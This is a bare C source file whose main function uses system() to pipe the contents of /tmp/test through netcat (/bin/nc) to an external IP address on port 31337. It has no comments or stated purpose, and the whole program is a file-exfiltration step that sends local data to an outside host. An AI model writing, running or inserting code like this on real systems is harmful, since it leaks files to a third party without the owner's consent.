#include <stdio.h>
#include <unistd.h>


int main()
{
    system("cat /tmp/test | /bin/nc -nv 80.86.91.39 31337");
}
